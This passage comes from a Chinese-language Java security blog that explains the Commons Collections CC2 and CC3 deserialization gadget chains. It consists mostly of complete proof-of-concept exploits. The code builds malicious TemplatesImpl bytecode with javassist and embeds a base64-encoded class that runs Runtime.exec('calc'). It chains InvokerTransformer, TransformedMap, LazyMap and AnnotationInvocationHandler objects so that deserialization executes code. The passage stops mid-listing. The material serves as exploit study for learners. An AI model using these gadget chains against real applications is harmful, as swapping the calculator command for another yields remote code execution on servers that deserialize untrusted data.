<p>思考一下其实到transform()方法的路线都是一样的，差别就在于这里是直接调用的InvokerTransformer的transform()方法，我们来看一下有些啥特殊之处：</p>
<p>这里就需要注意这个obj1了，因为InvokerTransformer需要注意传入的值。</p>
<p><img src="/2024/08/13/CC2/image-20240803152547911.png" alt="image-20240803152547911"></p>
<p>在前面的第一条链子的调试过程中我们很容易可以知道这里的obj1就代表queue[0]里面的templates对象，也就是前面那条链子反序列化时的：</p>
<p><img src="/2024/08/13/CC2/image-20240803015410963.png" alt="image-20240803015410963"></p>
<p>和</p>
<p><img src="/2024/08/13/CC2/image-20240803021405137.png" alt="image-20240803021405137"></p>
<p>这样就很清楚了。</p>
<p>那么同样的对于直接使用InvokerTransformer()方法也清楚了：<br><img src="/2024/08/13/CC2/image-20240803153502905.png" alt="image-20240803153502905"></p>
<p>跟我们之前说的CC3那里异曲同工，还是比较精妙的。</p>
<p>现在基本就通了，这里就是在动态加载字节码过程中的newInstance()时会触发static代码块，然后弹出计算机。</p>
<p>所以最终的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,Tcomparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取默认的ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//向ClassPool容器插入AbstractTranslet.class</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="comment">//创建Cat类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//就是创建static默认方法</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性”</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//更改类名，但是应该直接用Cat就行了，但是用来确保唯一性也是可以的</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置cc类的父类</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//cc.writeFile(&quot;output&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功按照预期弹出一个计算机。</p>
<p>稍微改一点javassist代码就可以得到构造出来的类为：<br><img src="/2024/08/13/CC2/image-20240803155725440.png" alt="image-20240803155725440"></p>
<p><strong>还有一个点</strong>就是为什么在动态加载字节码那里会少一行，这是因为TemplatesImpl类的readObject()方法有定义：<br><img src="/2024/08/13/CC2/image-20240803160301177.png" alt="image-20240803160301177"></p>
<p>在构造代码时也可以加上，像CC3那样。</p>
<p>但是我有点小奇怪的就是为啥不用在比如<code>Cat</code>类重写那两个<code>transform()</code>方法，但是无所谓，就算不能用应该也可以直接使用javassist将transform()方法添加上去。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC2</category>
      </categories>
  </entry>
  <entry>
    <title>CC3</title>
    <url>/2024/08/13/CC3/</url>
    <content><![CDATA[<p>CC3学习</p>
<span id="more"></span>

<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3就是将CC1和CC6调用链和动态加载字节码加在一起，所以需要有动态加载字节码的知识。</p>
<h2 id="利用TemplatesImpl构造CC3"><a href="#利用TemplatesImpl构造CC3" class="headerlink" title="利用TemplatesImpl构造CC3"></a>利用TemplatesImpl构造CC3</h2><p>在前面博客的文章中，讲述了Java中动态加载字节码的方法，其中就说明了<code>TemplatesImpl</code>的用法，通过调用其<code>newTransformer()</code>来实现链子的起点</p>
<p>在动态加载字节码中，利用<code>TemplatesImpl</code>构建的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        ctf.newTransformer();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意类的示例代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要在反序列化中利用TemplatesImpl来加载字节码，需要在反序列化中执行TemplatesImpl对象的newTransformer或getOutputProperties方法</p>
<p>结合在CC1中的TransformedMap链的基本代码的简化代码，可以如下构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ctf),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在就是看如何接入了CC链了</p>
<h3 id="结合CC1"><a href="#结合CC1" class="headerlink" title="结合CC1"></a>结合CC1</h3><h4 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h4><ul>
<li>commons-collections 3.2.1</li>
<li>JDK 8u65</li>
</ul>
<h4 id="CC3（TransformedMap链）"><a href="#CC3（TransformedMap链）" class="headerlink" title="CC3（TransformedMap链）"></a>CC3（TransformedMap链）</h4><p>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAQb3JnL2V4YW1wbGUvVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAoABAALAA0ADAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ctf),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<p><strong>这里要说明一个东西</strong>，就是利用链的InvokerTransformer初始化那里，可以和前面的CC1对比一下：</p>
<p><img src="/2024/08/13/CC3/image-20240730102412096.png" alt="image-20240730102412096"></p>
<p>如果 <code>paramTypes</code> 和 <code>args</code> 是 <code>null</code>，它们表示该方法没有参数。而如果它们是 <code>new Class[]&#123;null&#125;</code> 和 <code>new Object[]&#123;null&#125;</code>，这实际上是表示该方法有一个参数，但是该参数的类型和值都是 <code>null</code>，这种情况很可能导致方法调用失败，因为实际调用的方法没有参数，而代码却试图用一个 <code>null</code> 类型和 <code>null</code> 值进行调用。</p>
<p><strong>所以上面代码需要直接用两个null表示无参数的方法</strong></p>
<h4 id="CC3（LazyMap链）"><a href="#CC3（LazyMap链）" class="headerlink" title="CC3（LazyMap链）"></a>CC3（LazyMap链）</h4><p>POC（前面用的base64，这里就用IO读文件）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span 